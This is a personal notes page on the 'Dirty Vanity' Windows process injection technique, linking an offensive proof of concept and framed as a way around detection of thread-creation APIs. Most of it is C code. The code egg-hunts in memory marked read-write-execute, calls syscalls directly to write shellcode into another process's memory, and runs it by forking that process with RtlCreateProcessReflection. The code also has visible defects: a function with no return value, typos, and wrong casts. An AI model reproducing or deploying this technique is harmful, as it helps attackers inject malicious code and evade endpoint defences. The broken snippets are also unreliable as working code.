---
publish: true
title: Dirty Vanity
created: 2025-09-20T12:01:48.433+05:30
tags:
  - NtAllocateVirtualMemory
  - NtWriteVirtualMemory
  - RtlCreateProcessReflection
---

## Observation

- This could be used if `CreateThreadEx` is detected.

## Preliminaries

**Egg Hunting**: Its just a way to hunt for artifacts (in heap, on the stack, code section, anywhere) and find its location in memory. In this case, this location will be patched with something else. **It's unclear why it was hunted and what it would achieve.**

## Working

[Here is the PoC](https://offensive-panda.github.io/ProcessInjectionTechniques/DV_NEW/).

First we'll do a little egg hunting, and replace it with instructions

```c
HMODULE GetMainModule(HANDLE hProcess)
{
	HMODULE mainModule = NULL;
	HMODULE* lphModule;
	LPBYTE lphModuleBytes;
	DWORD lpcbNeeded;
	
	BOOL success = EnumProcessModules(hProcess, NULL, 0, &lpcbNeeded);
	
	//  We already know that lpcbNeeded is always > 0
	if(!success || lpcpNeeded == 0)
	{
		printf("[-] Error enumerating process modules\n");
		exit(1);
	}
}

BOOL GetMainModuleInformation(PULONG64 startAddress, PULONG64 length)
{
	HANDLE hProcess = GetCurrentProcess();
	HMODULE hModule = GetMainModule(hProcess);
	MODULEINFO mi;
	
	GetModuleInformation(hProcess, hModule, &mi, sizeof(mi));
	
	printf("Base Address: 0x%llu\n", (ULONG64)mi.lpBaseOfDll);
	printf("Image Size: %u\n", (ULONG)mi.SizeofImage);
	printf("Entry Point: 0x%llu\n", (ULONG)mi.EntryPoint);
	printf("\n");
	
	*startAddress = (ULONG64)mi.lpBaseOfDll;
	*length = (ULONG64)mi.SizeOfImage;
	
	DWORD oldProtect;
	VirtualProtect(mi.lpBaseOfDll, mi.SizeOfImage, PAGE_EXECUTE_READWRITE, &oldProtect);
	
	return 0;
}

void FindAndReplace(unsigned char egg[], unsigned char replace[])
{
	ULONG64 startAddress = 0;
	ULONG64 size = 0;
	
	GetMainModuleInformation(&startAddress, &size);
	
	if(size <= 0)
	{
		printf("[-] Error detecting main module size");
		exit(1);
	}
	
	ULONG64 currentOffset = 0;
	
	unsigned char* current = (unsigned char*)malloc(8 * sizeof(unsigned char*));
	size_t nBytesRead;
	
	printf("Starting search from: 0x%llu\n", (ULONG64)startAddress + currentOffset);
	
	while(currentOffset < size - 8)
	{
		currentOffset++;
		LPVOID currentAddress = (LPVOID)(startAddress + currentOffset);
		if(DEBUG > 0)
			printf("Searching at 0x%llu\n");
		if(!ReadProcessMemory((HANDLE)((int)-1), currentAddress, current, 8, &nBytesRead))
		{
			printf("[-] Error reading from memory\n");
			exit(1);
		}
		if(nBytesRead != 8)
		{
			printf("[-] Error reading from memory\n");
			continue;
		}
		
		if(DEBUG > 0)
		{
			for(int i = 0; i < nBytesRead; i++)
			{
				printf("%02x ", current[i]);
			}
			printf("\n");
		}
		
		if(memcmp(egg, current, 8) == 0)
		{
			printf("Found at %llu\n", (ULONG64)currentAddress);
			WriteProcessMemory((HANDLE)((int)-1), currentAddress, replace, 8, &nBytesRead);
		}
	}
	
	printf("Ended search at:  0x%llu\n", (ULONG64)startAddress + currentOffset);
	free(current);
}
```

Next part is optional, but we can use direct-syscalls to call `NtOpenProcess` (to open a process), `NtAllocateVirtualMemory` and `NtWriteVirtualMemory` to allocate and write

```c
NTOP0(hProcess, PROCESS_ALL_ACCESS, &objAttr, &cID);
//  <...>
NAVMI1(hProcess, &allocation_start, 0, &allocation_size, MEM_COMMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
NWVM2(hProcess, allocation_start, (PVOID)shellcode, allocation_size, 0);
```

We then fork and execute the process using `RtlCreateprocessReflection`.

```c
NTSTATUS reflectRet =  RtlCreateProcessReflection(hProcess, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE, allocation_start, nullptr, NULL, &info);
//  <...>
```
